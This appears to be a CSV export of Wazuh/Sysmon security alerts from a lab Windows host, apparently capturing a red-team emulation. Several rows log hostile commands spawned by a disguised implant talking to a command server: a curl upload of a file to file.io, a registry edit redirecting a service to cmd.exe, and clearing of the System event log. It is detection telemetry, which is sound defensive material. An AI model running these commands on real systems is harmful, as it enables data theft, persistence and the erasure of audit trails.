wazuh-alerts-4.x-2024.11.30,BfoNfJMBRlc-D5DFph-s,1,1,192.168.117.130,wazuh-agent,002,Maryam,"2024-12-01T07:49:23Z, RulesEngine",16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-01T07:49:23Z. Reason: RulesEngine.""",0,2024-11-30T07:51:23.467866200Z,1654,0,DESKTOP-FMI6MML,0,0,INFORMATION,Microsoft-Windows-Security-SPP,1,false,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:51:23.908",EventChannel,1732953083.1964861,"Nov 30, 2024 @ 07:51:23.908", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,EPoOfJMBRlc-D5DFYh8x,1,1,192.168.117.130,wazuh-agent,002,Maryam,"2024-12-01T07:49:12Z, RulesEngine",16384,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2024-12-01T07:49:12Z. Reason: RulesEngine.""",0,2024-11-30T07:52:12.702932200Z,1666,0,DESKTOP-FMI6MML,0,0,INFORMATION,Microsoft-Windows-Security-SPP,2,false,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:52:13.137",EventChannel,1732953133.2012894,"Nov 30, 2024 @ 07:52:13.137", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,EfoOfJMBRlc-D5DF6h_r,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,8224, ,0x80000000000000, ,4,Application, ,"""The VSS service is shutting down due to idle timeout. """, ,2024-11-30T07:52:42.593091000Z,1667, ,DESKTOP-FMI6MML,0, ,INFORMATION,VSS,1,false,5,The VSS service is shutting down due to idle timeout.,"[""windows"",""windows_application""]",60702, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:52:43.023",EventChannel,1732953163.2014489,"Nov 30, 2024 @ 07:52:43.023", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,2D20436F64653A2020434F525356434330303030303735392D2043616C6C3A2020434F525356434330303030303734312D205049443A202030303030343130342D205449443A202030303030343132302D20434D443A2020433A5C57696E646F77735C73797374656D33325C76737376632E6578652020202D20557365723A204E616D653A204E5420415554484F524954595C53595354454D2C205349443A532D312D352D313820, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,j_ojfJMBRlc-D5DFxx8o,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 08:15:27.825
ProcessGuid: {15959494-C99F-674A-E006-000000000D00}
ProcessId: 4424
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""%%windir%%\system32\cmd.exe""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:15:27.829603100Z,56354,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,18,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:15:28.911",EventChannel,1732954528.2390027,"Nov 30, 2024 @ 08:15:28.911", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4424, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-C99F-674A-E006-000000000D00},2024-11-30 08:15:27.825,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C reg.exe add \""HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\"" /f /v ImagePath /d \""%%windir%%\\system32\\cmd.exe\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,kPojfJMBRlc-D5DFxx8o,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 08:15:27.841
ProcessGuid: {15959494-C99F-674A-E106-000000000D00}
ProcessId: 7156
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: reg.exe  add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""C:\Windows\system32\cmd.exe""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: {15959494-C99F-674A-E006-000000000D00}
ParentProcessId: 4424
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""%windir%\system32\cmd.exe""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:15:27.843327400Z,56356,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,10,Value added to registry key has Base64-like pattern,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92041, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:15:28.926",EventChannel,1732954528.2396564,"Nov 30, 2024 @ 08:15:28.926", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7156, , , , , , , , , , ,"[""Obfuscated Files or Information"",""Modify Registry""]","[""T1027"",""T1112""]","[""Defense Evasion""]", , , ,reg.exe,C:\\Windows\\System32\\reg.exe,Microsoft® Windows® Operating System, , ,Registry Console Tool, , ,{15959494-C99F-674A-E106-000000000D00},2024-11-30 08:15:27.841,"SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-C99F-674A-E006-000000000D00},"cmd.exe /C reg.exe add \""HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\"" /f /v ImagePath /d \""%windir%\\system32\\cmd.exe\""",0x107a6b,4424,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"reg.exe  add \""HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\"" /f /v ImagePath /d \""C:\\Windows\\system32\\cmd.exe\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,e_ohfJMBRlc-D5DFdR9i,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:13:03.829
ProcessGuid: {15959494-C90F-674A-C306-000000000D00}
ProcessId: 5316
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -k -F ""file=@3945c9_artifact"" https://file.io/
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:13:03.831177600Z,56241,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,17,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:13:04.898",EventChannel,1732954384.2338756,"Nov 30, 2024 @ 08:13:04.898", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5316, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-C90F-674A-C306-000000000D00},2024-11-30 08:13:03.829,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C C:\\Windows\\System32\\Curl.exe -k -F \""file=@3945c9_artifact\"" https://file.io/",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,k_okfJMBRlc-D5DFdh_y,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1070.001,technique_name=Clear Windows Event Logs
UtcTime: 2024-11-30 08:16:21.867
ProcessGuid: {15959494-C9D5-674A-E506-000000000D00}
ProcessId: 4560
Image: C:\Windows\System32\wevtutil.exe
FileVersion: 10.0.17134.81 (WinBuild.160101.0800)
Description: Eventing Command Line Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wevtutil.exe
CommandLine: wevtutil  cl System
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=26B0ED4281B2545C9A49FA31B4E8E7E8E2575D97,MD5=0269064AA2DD91125F13635FB194F499,SHA256=AB86C6C090FA85C2920A637D2BE274335A86FBC0A7FB706E893493B50840DC0A,IMPHASH=89A3D9DE9FED48F734C9553D16342280
ParentProcessGuid: {15959494-C9D5-674A-E406-000000000D00}
ParentProcessId: 6396
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C wevtutil cl System
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:16:21.870795400Z,56361,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,11,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:16:22.941",EventChannel,1732954582.2410806,"Nov 30, 2024 @ 08:16:22.941", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4560, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,wevtutil.exe,C:\\Windows\\System32\\wevtutil.exe,Microsoft® Windows® Operating System, , ,Eventing Command Line Utility, , ,{15959494-C9D5-674A-E506-000000000D00},2024-11-30 08:16:21.867,"SHA1=26B0ED4281B2545C9A49FA31B4E8E7E8E2575D97,MD5=0269064AA2DD91125F13635FB194F499,SHA256=AB86C6C090FA85C2920A637D2BE274335A86FBC0A7FB706E893493B50840DC0A,IMPHASH=89A3D9DE9FED48F734C9553D16342280","technique_id=T1070.001,technique_name=Clear Windows Event Logs",Microsoft Corporation,10.0.17134.81 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-C9D5-674A-E406-000000000D00},cmd.exe /C wevtutil cl System,0x107a6b,6396,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,wevtutil  cl System,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ifojfJMBRlc-D5DFPx9G,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 08:14:57.788
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_1346882771\CRX_INSTALL\background.js
CreationUtcTime: 2024-11-30 08:14:57.788
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:14:57.788404400Z,56287,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,45,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:14:58.866",EventChannel,1732954498.2371725,"Nov 30, 2024 @ 08:14:58.866", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 08:14:57.788, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_1346882771\\CRX_INSTALL\\background.js,2024-11-30 08:14:57.788, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ivojfJMBRlc-D5DFPx9G,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 08:14:57.821
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_1346882771\CRX_INSTALL\main.js
CreationUtcTime: 2024-11-30 08:14:57.821
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:14:57.823046800Z,56289,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,46,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:14:58.898",EventChannel,1732954498.2374786,"Nov 30, 2024 @ 08:14:58.898", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 08:14:57.821, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_1346882771\\CRX_INSTALL\\main.js,2024-11-30 08:14:57.821, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,i_ojfJMBRlc-D5DFPx9G,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 08:14:57.832
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_1346882771\CRX_INSTALL\page_api.js
CreationUtcTime: 2024-11-30 08:14:57.832
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:14:57.833335100Z,56290,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,47,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:14:58.914",EventChannel,1732954498.2377823,"Nov 30, 2024 @ 08:14:58.914", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 08:14:57.832, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_1346882771\\CRX_INSTALL\\page_api.js,2024-11-30 08:14:57.832, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
